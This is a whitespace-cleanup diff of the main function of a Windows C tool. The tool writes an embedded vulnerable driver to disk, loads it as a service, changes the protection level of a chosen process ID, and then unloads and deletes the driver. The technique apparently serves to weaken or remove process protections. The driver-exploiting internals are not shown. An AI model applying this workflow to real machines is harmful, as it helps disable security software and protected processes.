@@ -27,7 +27,7 @@ int main(int argc, char** argv) {
 	BOOL	bSTATE					= TRUE;
 	DWORD64 dwPID					= 0;	// Stores the PID of the target proccess
 	DWORD	dwProtectionLevel		= 0;	// Stores the choosen protection level
-	LPWSTR	szVulnDriverPath		= NULL; // 
+	LPWSTR	szVulnDriverPath		= NULL; //
 
 	// If not enough arguments are supplied print the help function
 	if (argc < 5) {
@@ -62,7 +62,7 @@ int main(int argc, char** argv) {
 	}
 	PrintOffsets();
 	okay("GetOffsets - Retrieved offsets");
-	
+
 	// Write the vulnerable driver to the file system
 	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
 	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
@@ -74,7 +74,7 @@ int main(int argc, char** argv) {
 	}
 	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
 	printf("\n");
-	
+
 	// Load the vulnerable driver as a service
 	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
 	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
@@ -84,7 +84,7 @@ int main(int argc, char** argv) {
 	}
 	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
 	printf("\n");
-	
+
 	// Change protection level
 	info("ChangeProtectionLevel - Changing protection level of PID %d to 0x%02X", dwPID, dwProtectionLevel);
 	if (!ChangeProtectionLevel(dwPID, dwProtectionLevel)) {
@@ -94,11 +94,11 @@ int main(int argc, char** argv) {
 	}
 	info("ChangeProtectionLevel - Protectection level of PID %d changed to 0x%02X", dwPID, dwProtectionLevel);
 	printf("\n");
-	
+
 _cleanUp:
 
 	// ** CLEANUP SECTION ** //
-	
+
 	// Unloading vulnerable driver
 	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	if (!UnloadDriver(g_VULNDRIVERNAME)) {
@@ -107,7 +107,7 @@ _cleanUp:
 	}
 	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	printf("\n");
-	
+
 	// Remove vulnerable driver from filesystem
 	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
 	if (!RemoveFileW(szVulnDriverPath)) {
@@ -116,7 +116,7 @@ _cleanUp:
 	}
 	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
 	printf("\n");
-	
+
 	// Free allocated memory
 	if (szVulnDriverPath != NULL) {
 		free(szVulnDriverPath);
@@ -128,5 +128,5 @@ _cleanUp:
 	else {
 		return EXIT_FAILURE;
 	}
-	
+
 }
